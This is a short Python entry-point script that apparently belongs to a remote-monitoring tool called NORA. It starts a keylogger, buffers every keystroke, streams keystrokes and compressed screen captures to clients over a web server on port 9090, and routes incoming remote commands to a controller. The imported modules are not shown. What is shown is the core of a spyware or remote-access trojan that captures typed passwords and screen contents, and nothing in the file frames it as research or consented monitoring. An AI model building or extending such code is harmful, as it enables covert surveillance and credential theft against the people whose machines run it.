import threading
import sys
import os

import server
import keylogger as kl
import screencap as sc
import controller

PORT = int(os.environ.get("NORA_PORT", 9090))

_keylog_buffer = []
_key_lock = threading.Lock()


def on_key(char):
    with _key_lock:
        _keylog_buffer.append(char)
    server.broadcast_key(char)


def on_frame(b64):
    server.broadcast_frame(b64)


def main():
    server.init(controller.handle_command)

    keylogger = kl.Keylogger(on_key)
    keylogger.start()

    capture = sc.ScreenCapture(on_frame, fps=12, quality=55, scale=0.6)
    capture.start()

    # Block on the web server (runs in this thread)
    server.run(port=PORT)


if __name__ == "__main__":
    main()
